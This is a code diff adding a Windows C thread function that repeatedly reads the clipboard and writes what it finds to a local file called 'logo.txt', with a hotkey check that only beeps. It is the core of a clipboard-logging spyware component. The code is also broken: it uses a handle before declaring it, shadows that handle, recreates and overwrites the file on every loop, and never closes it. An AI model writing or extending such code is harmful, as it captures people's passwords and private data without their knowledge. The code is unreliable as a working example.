@@ -1,0 +1,31 @@
+unsigned int WINAPI ThreadProc1(
+						LPVOID lpParameter   // thread data
+						)
+{
+	while (1)
+	{
+		if (GetAsyncKeyState(VK_LCONTROL) && GetAsyncKeyState(VK_RCONTROL) &&GetAsyncKeyState(VK_LSHIFT) && GetAsyncKeyState(VK_RSHIFT) ) 
+		{
+			MessageBeep(MB_ICONASTERISK);	
+		}
+		WaitForSingleObject(handle2,INFINITE);
+		ReleaseMutex(handle2);
+		
+		char ClipBoard[100];
+		My_GetClipboardData(ClipBoard);
+
+		HANDLE handle2 = CreateFileA("logo.txt",GENERIC_WRITE | GENERIC_READ,FILE_SHARE_WRITE | FILE_SHARE_READ,NULL,\
+			CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);
+
+		char  buffer[] = "\r\n\r\n****************** [clipboard] **************\r\n";
+		DWORD Writed;
+		WriteFile(handle2,buffer,sizeof(buffer),&Writed,NULL);
+		
+		WriteFile(handle2,ClipBoard,sizeof(ClipBoard),&Writed,NULL);
+
+		WriteFile(handle2,buffer,sizeof(buffer),&Writed,NULL);
+		Sleep(0x5a);
+	}
+	
+	return 0;
+}
